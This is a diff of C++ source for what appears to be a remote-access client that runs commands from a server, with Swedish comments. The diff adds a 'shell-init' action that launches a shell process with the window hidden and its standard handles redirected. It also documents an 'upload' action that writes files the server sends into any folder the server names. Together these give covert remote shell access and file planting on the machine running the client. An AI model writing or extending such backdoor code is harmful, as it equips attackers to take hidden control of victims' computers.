@@ -1,6 +1,7 @@
 #pragma once
 #include "precompile.h"
 #include "client.h"
+#include "shell_process.h"
 #include "payloads.h"
 
 response_table client::get_responses()
@@ -36,23 +37,37 @@ action_table client::get_actions()
 		}},
 		{"upload", [&](std::string data) {
 			auto [file, folder] = helper::ArgSplit(data, '|');
-			std::cout << folder + "\\" + std::filesystem::path(file).filename().string() << std::endl;
-			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary);
+			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary); // öppna en filen som ska motas
 
-			if (output.good()) {
+			if (output.good()) { // om det går att öppna filen på den platsen
 				client_implentation.send({ "upload_status", "Ok" });
 			}
-			else {
+			else { // annars går det inte att öppna pga kanske fel ägare av mappen eller skrivrättigheter
 				client_implentation.send({ "upload_status", ":<" });
 				return;
 			}
 
-			packet file_data = client_implentation.receive_packet();
+			packet file_data = client_implentation.receive_packet(); // ta emot filen
 
-			output << file_data.data;
+			output << file_data.data; // skriv filen
 
-			output.close();
+			output.close(); // stäng filen
 			
+		}},
+		{"shell-init", [&](std::string data)
+		{
+			auto [shell, cwd] = helper::ArgSplit(data, '|');
+
+			properties prop{
+				shell,
+				cwd,
+				CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
+				STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
+				SW_HIDE,
+				false
+			};
+
+			shell_process process(prop);
 		}}
 	};
 }
